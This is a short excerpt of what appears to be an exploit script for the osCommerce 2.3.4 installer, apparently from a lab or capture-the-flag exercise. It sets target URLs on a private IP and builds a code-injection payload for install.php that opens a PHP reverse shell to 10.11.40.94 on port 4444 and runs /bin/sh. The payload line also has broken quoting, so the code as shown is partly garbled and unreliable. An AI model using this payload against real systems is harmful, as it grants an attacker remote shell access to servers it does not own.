...
base_url = "http://10.10.64.74:8080/oscommerce-2.3.4/catalog/"
target_url = "http://10.10.64.74:8080/oscommerce-2.3.4/catalog/install/install.php?step=4"
...
payload = '\');'
payload += 'php -r 'sock=fsockopen("10.11.40.94",4444);exec("/bin/sh -i <&3 >&3 2>&3");''    # this is where you enter you PHP payload
payload += '/*'
